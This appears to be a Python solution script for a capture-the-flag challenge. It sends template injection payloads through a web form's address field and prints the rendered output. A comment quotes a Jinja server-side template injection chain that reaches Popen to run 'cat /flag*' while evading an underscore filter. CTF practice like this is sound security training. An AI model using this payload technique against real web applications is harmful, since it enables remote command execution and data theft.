#!/usr/bin/env python3
import requests
from bs4 import BeautifulSoup

SITE = "http://flagdownloader.challs.olicyber.it/premium"

while True:
    PAYLOAD = input("Enter the payload: ") 
    # il payload è quello della writeup ufficiale volendo
    # [][config["FLAG"][61]*2 + "class" + config["FLAG"][61]*2][ config["FLAG"][61]*2 + "mro" + config["FLAG"][61]*2][1][config["FLAG"][61]*2+"subclasses"+config["FLAG"][61]*2]()[360]("cat /flag*",shell=True,stdout=-1)["communicate"]()[0]
    data = {"inputEmail":"sos@gmail.com", "inputPassword":"sos", "inputAddress": f"{{{{{PAYLOAD}}}}}", "inputCreditCard":"1234567890123456"}
    r = requests.post(SITE, data=data)
    zuppa = BeautifulSoup(r.text, "html.parser")
    black = ["email", "sos@gmail.com", "address", " credit card number", " 1234567890123456"]
    t = False
    for i in zuppa.find_all("td"):
        if not any(x in str(i) for x in black):
            t = True
            resp = str(i).replace("<td>", "").replace("</td>", "")
            print(resp)
    if not t:
        print(r.text)
